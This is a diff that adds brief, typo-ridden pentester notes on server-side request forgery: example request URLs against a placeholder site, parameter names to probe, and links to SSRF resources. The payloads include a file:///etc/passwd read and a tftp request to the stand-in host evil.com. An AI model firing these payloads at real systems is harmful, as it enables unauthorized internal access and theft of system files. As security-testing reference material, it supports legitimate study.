@@ -1,0 +1,63 @@
+Servier side request forgery
+
+
+http://acme...?url=http://google.com
+http://acme.com/redirect.php=//google.com
+http://acme.com/redirect.php?url=google.com
+http://acme.com/redirect.php?url=/path/somehting/here
+
+
+
+LFI & RFI similar
+
+http://acme.com/redirect.php?URL=file:///etc/passwd
+
+http://acme.com/ssrf.php?url=tftp://evil.com:12345/Testpacket
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PAYLOAD to Look for
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+file=
+location=
+locale=
+path=
+display=
+load=
+read=
+retrieve=
+folder=
+style=
+tempalte=
+doc=
+source=
+pdf=
+dest=
+continue=
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+Blacklists  - Alternate IP encoding
+
+URL
+SSRF bible
+
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20SSRF%20bible%20Cheatsheet.pdf
+
+
+Resources:
+
+Pivoting from SSRF to RCE with HashiCorp Cosul
+
+Exploiting Server Side Request Forgery on a Node/Express Application
+
+Server-side browsing condiered harmful
+
+How To: Server Side Request Forgery
+
+Escalating XSS in PjantomJS Image Renderint to SSRF / Local Firel Read
+
+Burp, Collaborate and listen: A pentester reviews the latest burp suite addtiona
